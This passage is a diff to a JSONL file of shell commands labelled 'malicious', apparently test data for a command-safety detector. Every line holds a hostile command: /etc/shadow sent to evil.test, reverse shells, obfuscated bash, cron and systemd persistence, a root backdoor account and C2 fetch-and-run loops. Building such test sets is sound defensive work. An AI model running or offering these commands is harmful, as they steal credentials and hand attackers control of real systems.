@@ -28,3 +28,8 @@
 {"id": "b28", "label": "malicious", "desc": "firewall disable exfil", "command": "iptables -F && iptables -P INPUT ACCEPT && iptables -P OUTPUT ACCEPT && cat /etc/shadow | base64 | curl -X POST -d @- http://evil.test/exfil"}
 {"id": "b29", "label": "malicious", "desc": "systemd timer persist", "command": "mkdir -p /etc/systemd/system && echo -e '[Unit]\\nDescription=Update\\n[Timer]\\nOnCalendar=*:0/5\\n[Install]\\nWantedBy=timers.target' > /etc/systemd/system/update.timer && systemctl enable update.timer 2>/dev/null"}
 {"id": "b30", "label": "malicious", "desc": "multi-stage attack", "command": "useradd -o -u 0 backdoor 2>/dev/null; echo 'backdoor:password' | chpasswd 2>/dev/null; mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3attack' >> /root/.ssh/authorized_keys; echo '* * * * * curl http://evil.test/c2|bash' | crontab -"}
+{"id": "b31", "label": "malicious", "desc": "disguised as pip install", "command": "pip install requests && echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"}
+{"id": "b32", "label": "malicious", "desc": "hex obfuscated shell", "command": "printf '\\x62\\x61\\x73\\x68\\x20\\x2d\\x69' | bash"}
+{"id": "b33", "label": "malicious", "desc": "dollar quote evasion", "command": "$'\\x63\\x75\\x72\\x6c' http://evil.test/payload | $'\\x62\\x61\\x73\\x68'"}
+{"id": "b34", "label": "malicious", "desc": "trap anti-kill persist", "command": "trap '' INT TERM HUP EXIT; while true; do curl -s http://evil.test/c2 | bash; sleep 300; done &"}
+{"id": "b35", "label": "malicious", "desc": "apt disguised backdoor", "command": "apt-get update -qq && echo '#!/bin/bash\ncurl http://evil.test/c2|bash' > /etc/cron.d/apt-daily-upgrade && chmod 644 /etc/cron.d/apt-daily-upgrade"}
